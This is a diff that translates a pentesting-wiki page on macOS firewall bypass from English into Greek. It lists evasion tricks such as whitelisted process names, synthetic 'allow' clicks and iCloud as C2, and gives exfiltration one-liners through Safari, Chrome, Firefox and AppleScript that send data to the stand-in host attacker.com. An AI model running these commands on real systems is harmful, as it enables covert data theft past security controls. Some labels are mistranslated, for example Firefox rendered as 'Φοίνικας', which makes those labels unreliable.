@@ -4,82 +4,72 @@
 
 ## Found techniques
 
-The following techniques were found working in some macOS firewall apps.
+Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε ορισμένες εφαρμογές firewall macOS.
 
 ### Abusing whitelist names
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- Για παράδειγμα, καλώντας το κακόβουλο λογισμικό με ονόματα γνωστών διαδικασιών macOS όπως **`launchd`**
 
 ### Synthetic Click
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- Αν το firewall ζητήσει άδεια από τον χρήστη, κάντε το κακόβουλο λογισμικό να **κλικάρει στο allow**
 
 ### **Use Apple signed binaries**
 
-- Like **`curl`**, but also others like **`whois`**
+- Όπως **`curl`**, αλλά και άλλες όπως **`whois`**
 
 ### Well known apple domains
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+Το firewall θα μπορούσε να επιτρέπει συνδέσεις σε γνωστούς τομείς της Apple όπως **`apple.com`** ή **`icloud.com`**. Και το iCloud θα μπορούσε να χρησιμοποιηθεί ως C2.
 
 ### Generic Bypass
 
-Some ideas to try to bypass firewalls
+Ορισμένες ιδέες για να προσπαθήσετε να παρακάμψετε τα firewalls
 
 ### Check allowed traffic
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
-
+Γνωρίζοντας την επιτρεπόμενη κίνηση θα σας βοηθήσει να εντοπίσετε πιθανούς λευκούς τομείς ή ποιες εφαρμογές επιτρέπεται να έχουν πρόσβαση σε αυτούς.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
+### Κατάχρηση DNS
 
-### Abusing DNS
-
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+Οι επιλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`** που πιθανώς θα επιτρέπεται να επικοινωνεί με τους διακομιστές DNS.
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Browser apps
+### Μέσω εφαρμογών προγράμματος περιήγησης
 
 - **oascript**
-
 ```applescript
 tell application "Safari"
-    run
-    tell application "Finder" to set visible of process "Safari" to false
-    make new document
-    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+run
+tell application "Finder" to set visible of process "Safari" to false
+make new document
+set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-
 - Google Chrome
-
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
-- Firefox
-
+- Φοίνικας
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
-- Safari
-
+- Σαφάρι
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
+### Μέσω εισβολών διαδικασιών
 
-### Via processes injections
-
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+Αν μπορείτε να **εισάγετε κώδικα σε μια διαδικασία** που επιτρέπεται να συνδεθεί σε οποιονδήποτε διακομιστή, θα μπορούσατε να παρακάμψετε τις προστασίες του τείχους προστασίας:
 
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
-## References
+## Αναφορές
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
